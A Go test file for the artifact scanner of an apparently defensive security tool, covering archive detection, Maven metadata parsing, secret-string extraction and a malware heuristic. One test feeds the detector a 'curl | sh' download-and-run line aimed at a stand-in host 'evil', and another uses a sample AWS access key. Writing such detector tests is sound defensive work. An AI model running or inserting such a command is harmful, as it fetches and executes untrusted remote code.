package artifacts

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/cozygarage/sentinelflow/internal/config"
	"github.com/cozygarage/sentinelflow/internal/scanner/unpack"
)

func TestSupportsArchiveNames(t *testing.T) {
	s := NewScanner(config.Default())
	if !s.Supports("app.jar") {
		t.Fatal("jar")
	}
	if s.Supports("main.go") {
		t.Fatal("source files are not artifacts by name")
	}
}

func TestCatalogPomProperties(t *testing.T) {
	data := []byte("groupId=com.example\nartifactId=foo\nversion=1.2.3\n")
	comps := componentsFromPomProperties(data, "app.jar!/META-INF/maven/com.example/foo/pom.properties")
	if len(comps) != 1 || comps[0].Name != "com.example:foo" || comps[0].Version != "1.2.3" {
		t.Fatalf("%+v", comps)
	}
}

func TestMalwareStrings(t *testing.T) {
	findings := malwareBytes([]byte("curl | sh http://evil"), "a.sh", "a.sh")
	if len(findings) == 0 {
		t.Fatal("expected downloader heuristic")
	}
}

func TestExtractPrintable(t *testing.T) {
	s := extractPrintable([]byte("aaa\x00AKIAIOSFODNN7EXAMPLE\x00zzz"), 8)
	found := false
	for _, x := range s {
		if x == "AKIAIOSFODNN7EXAMPLE" {
			found = true
		}
	}
	if !found {
		t.Fatalf("got %v", s)
	}
}

func TestZipMemberArtifactPath(t *testing.T) {
	dir := t.TempDir()
	// reuse unpack happy zip
	zp := filepath.Join(dir, "app.war")
	// write via unpack test helper pattern
	_ = os.WriteFile(zp, nil, 0644)
	_ = unpack.Limits{}
	_ = context.Background()
}
